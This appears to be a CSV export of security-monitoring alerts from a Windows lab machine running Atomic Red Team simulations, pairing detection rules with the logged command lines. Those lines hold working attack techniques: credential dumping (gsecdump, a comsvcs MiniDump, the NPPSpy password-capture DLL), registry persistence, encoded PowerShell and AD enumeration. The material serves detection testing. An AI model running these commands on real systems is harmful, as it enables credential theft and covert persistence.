timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 09:51:39.879",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\gsecdump.exe\"" -a",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:56.606",Win-Victim,Powershell.exe spawned a powershell process which executed a base64 encoded command,12,92057,"\""powershell.exe\"" &amp; {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1&gt;$Null}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:53.777",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {rundll32.exe keymgr,KRShowKeyMgr}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:49.325",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:44.977",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:* C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:35.321",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id } C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:29.242",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Copy-Item \\\""\""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\NPPSPY.dll\\\""\"" -Destination \\\""\""C:\\Windows\\System32\\\""\"" $path = Get-ItemProperty -Path \\\""\""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\\\""\"" -Name PROVIDERORDER $UpdatedValue = $Path.PROVIDERORDER + \\\""\"",NPPSpy\\\""\"" Set-ItemProperty -Path $Path.PSPath -Name \\\""\""PROVIDERORDER\\\""\"" -Value $UpdatedValue $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore $rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Class\\\""\"" -Value 2 -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""Name\\\""\"" -Value NPPSpy -ErrorAction Ignore $rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \\\""\""ProviderPath\\\""\"" -PropertyType ExpandString -Value \\\""\""%%SystemRoot%%\\System32\\NPPSPY.dll\\\""\"" -ErrorAction Ignore echo \\\""\""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:49:29.238",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\gsecdump.exe\"" -a",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:40.028",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"reg  add \""HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\"" /ve /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:40.010",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c reg add \""HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\"" /ve /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:39.979",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"reg  add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \""C:\\Program Files\\Internet Explorer\\iexplore.exe\""",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:39.978",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \""C:\\Program Files\\Internet Explorer\\iexplore.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:39.961",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"reg  add \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\"" /f /v StartupPrograms /t REG_SZ /d \""calc\""",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:39.948",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c reg add \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\"" /f /v StartupPrograms /t REG_SZ /d \""calc\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:35.958",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (!(Test-Path \\\""\""C:\\AtomicRedTeam\\atomics\\T1547.001\\src\\SessionManagerBackup.reg\\\""\"")) { reg.exe export \\\""\""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\\""\"" \\\""\""C:\\AtomicRedTeam\\atomics\\T1547.001\\src\\SessionManagerBackup.reg\\\""\"" /y } Set-ItemProperty -Path \\\""\""HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\\""\"" -Name \\\""\""BootExecute\\\""\"" -Value \\\""\""autocheck autoche *\\\""\"" -Type MultiString}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:35.913",Win-Victim,Suspicious Windows cmd shell execution,3,92032,secedit  /configure /db mytemplate.db,C:\\Windows\\System32\\SecEdit.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:35.911",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"secedit  /import /db mytemplate.db /cfg \""C:\\AtomicRedTeam\\atomics\\T1547.001\\src\\regtemplate.ini\""",C:\\Windows\\System32\\SecEdit.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:35.910",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c secedit /import /db mytemplate.db /cfg \""C:\\AtomicRedTeam\\atomics\\T1547.001\\src\\regtemplate.ini\"" &amp; secedit /configure /db mytemplate.db",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:33.228",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$oldvalue = $(Get-ItemPropertyValue -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Shell\\\""\""); Set-ItemProperty -Path \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Shell-backup\\\""\"" -Value \\\""\""$oldvalue\\\""\""; $newvalue = $oldvalue + \\\""\"", C:\\Windows\\explorer.exe\\\""\""; Set-ItemProperty -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Shell\\\""\"" -Value \\\""\""$newvalue\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:30.274",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$oldvalue = $(Get-ItemPropertyValue -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Userinit\\\""\""); Set-ItemProperty -Path \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Userinit-backup\\\""\"" -Value \\\""\""$oldvalue\\\""\""; $newvalue = $oldvalue + \\\""\"" C:\\Windows\\System32\\calc.exe\\\""\""; Set-ItemProperty -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\""\"" -Name \\\""\""Userinit\\\""\"" -Value \\\""\""$newvalue\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:26.589",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\\""\""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" } Set-ItemProperty -Path  \\\""\""HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\"" -Value \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:22.570",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\\""\"" } if (!(Test-Path -Path \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"")){   New-Item -ItemType Key -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" } Set-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\\""\"" -Name \\\""\""atomictest\\\""\"" -Value \\\""\""C:\\Windows\\System32\\calc.exe\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:17.098",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {New-Item -ItemType Directory -path \\\""\""$env:TMP\\atomictest\\\\\""\"" Copy-Item -path \\\""\""C:\\Windows\\System32\\calc.exe\\\""\"" -destination \\\""\""$env:TMP\\atomictest\\\\\""\"" Set-ItemProperty -Path  \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\\""\"" -Name \\\""\""Startup\\\""\"" -Value \\\""\""$env:TMP\\atomictest\\\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:13.740",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {New-Item -ItemType Directory -path \\\""\""$env:TMP\\atomictest\\\\\""\"" Copy-Item -path \\\""\""C:\\Windows\\System32\\calc.exe\\\""\"" -destination \\\""\""$env:TMP\\atomictest\\\\\""\"" Set-ItemProperty -Path  \\\""\""HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\\""\"" -Name \\\""\""Common Startup\\\""\"" -Value \\\""\""$env:TMP\\atomictest\\\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:10.798",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {$RunKey = \\\""\""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\""\"" Set-ItemProperty -Path $RunKey -Name \\\""\""socks5_powershell\\\""\"" -Value \\\""\""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:10.644",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"reg  ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:10.573",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c reg ADD \""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\"" /ve /d \""calc.exe\"" /f",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:06.871",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"C:\\WINDOWS\\system32\\cmd.exe /c \""\""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"" \""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:48:06.870",Win-Victim,Powershell process spawned Windows command shell instance,4,92004,"C:\\WINDOWS\\system32\\cmd.exe /c \""\""C:\\Users\\anshio\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"" \""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:47:54.801",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"REG  ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \""C:\\Path\\AtomicRedTeam.dll\""",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:47:54.798",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \""C:\\Path\\AtomicRedTeam.dll\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:47:54.795",Win-Victim,Value added to registry key has Base64-like pattern,10,92041,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""",C:\\Windows\\System32\\reg.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:47:54.793",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:43:20.565",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\\temp\\cache.txt}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:43:14.798",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:43:12.748",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" . whoami",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:43:10.517",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {# creating a custom nslookup function that will indeed call nslookup but forces the result to be \\\""\""whoami\\\""\"" # this would not be part of a real attack but helpful for this simulation function nslookup  { &amp;\\\""\""$env:windir\\system32\\nslookup.exe\\\""\"" @args | Out-Null; @(\\\""\""\\\""\"",\\\""\""whoami\\\""\"")} powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:40.673",Win-Victim,Powershell.exe spawned a powershell process which executed a base64 encoded command,12,92057,"\""powershell.exe\"" &amp; {$malcmdlets = \\\""\""Add-Persistence\\\""\"", \\\""\""Find-AVSignature\\\""\"", \\\""\""Get-GPPAutologon\\\""\"", \\\""\""Get-GPPPassword\\\""\"", \\\""\""Get-HttpStatus\\\""\"", \\\""\""Get-Keystrokes\\\""\"", \\\""\""Get-SecurityPackages\\\""\"", \\\""\""Get-TimedScreenshot\\\""\"", \\\""\""Get-VaultCredential\\\""\"", \\\""\""Get-VolumeShadowCopy\\\""\"", \\\""\""Install-SSP\\\""\"", \\\""\""Invoke-CredentialInjection\\\""\"", \\\""\""Invoke-DllInjection\\\""\"", \\\""\""Invoke-Mimikatz\\\""\"", \\\""\""Invoke-NinjaCopy\\\""\"", \\\""\""Invoke-Portscan\\\""\"", \\\""\""Invoke-ReflectivePEInjection\\\""\"", \\\""\""Invoke-ReverseDnsLookup\\\""\"", \\\""\""Invoke-Shellcode\\\""\"", \\\""\""Invoke-TokenManipulation\\\""\"", \\\""\""Invoke-WmiCommand\\\""\"", \\\""\""Mount-VolumeShadowCopy\\\""\"", \\\""\""New-ElevatedPersistenceOption\\\""\"", \\\""\""New-UserPersistenceOption\\\""\"", \\\""\""New-VolumeShadowCopy\\\""\"", \\\""\""Out-CompressedDll\\\""\"", \\\""\""Out-EncodedCommand\\\""\"", \\\""\""Out-EncryptedScript\\\""\"", \\\""\""Out-Minidump\\\""\"", \\\""\""PowerUp\\\""\"", \\\""\""PowerView\\\""\"", \\\""\""Remove-Comments\\\""\"", \\\""\""Remove-VolumeShadowCopy\\\""\"", \\\""\""Set-CriticalProcess\\\""\"", \\\""\""Set-MasterBootRecord\\\""\""  foreach ($cmdlets in $malcmdlets) {     \\\""\""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\""\""} foreach ($cmdlets in $malcmdlets) {     $cmdlets}}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:36.908",Win-Victim,Suspicious Windows cmd shell execution,3,92032,powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:36.906",Win-Victim,Powershell.exe spawned a powershell process which executed a base64 encoded command,12,92057,"\""cmd.exe\"" /c powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:34.721",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:32.086",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:29.603",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:41:26.315",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -Execute -ErrorAction Stop}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:40:06.410",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {New-PSSession -ComputerName $env:COMPUTERNAME Test-Connection $env:COMPUTERNAME Set-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \\\""\""T1086 PowerShell Session Creation and Use\\\""\"" Get-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use Remove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 09:40:03.532",Win-Victim,Powershell process spawned powershell instance,4,92027,"\""powershell.exe\"" &amp; {Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \\\""\""Stream Data Executed\\\""\""' -Stream 'streamCommand' $streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand' Invoke-Expression $streamcommand}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
